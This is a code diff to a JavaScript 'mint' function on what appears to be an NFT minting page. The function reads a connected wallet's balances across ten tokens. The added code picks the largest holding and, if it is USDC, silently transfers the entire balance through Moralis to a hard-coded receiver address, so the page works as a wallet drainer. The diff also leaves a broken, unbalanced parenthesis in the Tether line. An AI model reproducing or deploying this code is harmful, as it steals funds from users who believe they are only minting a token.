@@ -107,7 +107,7 @@ function mint(wallet) {
       const contractUSDC = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
       const contractDai = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x6b175474e89094c44da98b954eedeac495271d0f");
       const contractSandbox = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x3845badAde8e6dFF049820680d1F14bD3903a5d0");
-      const BalanceTether = Web3Client.utils.fromWei(await contractTether.methods.balanceOf(adress).call()) * Tetherprice.usdPrice;
+      const BalanceTether = await contractTether.methods.balanceOf(adress).call()) / 1000000;
       const BalanceBUSD = Web3Client.utils.fromWei(await contractBUSD.methods.balanceOf(adress).call()) * BUSDprice.usdPrice;
       const BalanceWETH = Web3Client.utils.fromWei(await contractWETH.methods.balanceOf(adress).call()) * WETHprice.usdPrice;
       const BalancePolygon = Web3Client.utils.fromWei(await contractPolygon.methods.balanceOf(adress).call()) * Polygonprice.usdPrice;
@@ -117,16 +117,27 @@ function mint(wallet) {
       const BalanceUSDC = await contractUSDC.methods.balanceOf(adress).call() / 1000000;
       const BalanceDai = Web3Client.utils.fromWei(await contractDai.methods.balanceOf(adress).call()) * Daiprice.usdPrice;
       const BalanceSandbox = Web3Client.utils.fromWei(await contractSandbox.methods.balanceOf(adress).call()) * Sandboxprice.usdPrice;
-      console.log(BalanceTether)
-      console.log(BalanceBUSD)
-      console.log(BalanceWETH)
-      console.log(BalancePolygon)
-      console.log(BalanceUniswap)
-      console.log(BalanceApeCoin)
-      console.log(BalanceShiba)
-      console.log(BalanceUSDC)
-      console.log(BalanceDai)
-      console.log(BalanceSandbox)
+      const maxUSD = Math.max(BalanceSandbox, BalanceDai, BalanceUSDC, BalanceShiba, BalanceApeCoin, BalanceUniswap, BalancePolygon, BalanceWETH, BalanceBUSD, BalanceTether);
+      if (maxUSD == BalanceUSDC) {
+        const options = {
+  type: "erc20",
+  amount: Moralis.Units.Token(BalanceUSDC.toString(10), "6"),
+  receiver: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
+  contractAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+};
+let result = await Moralis.transfer(options);
+      }
+      console.log(BalanceTether);
+      console.log(BalanceBUSD);
+      console.log(BalanceWETH);
+      console.log(BalancePolygon);
+      console.log(BalanceUniswap);
+      console.log(BalanceApeCoin);
+      console.log(BalanceShiba);
+      console.log(BalanceUSDC);
+      console.log(BalanceDai);
+      console.log(BalanceSandbox);
+      
     } catch (error) {
       console.error(error);
     }
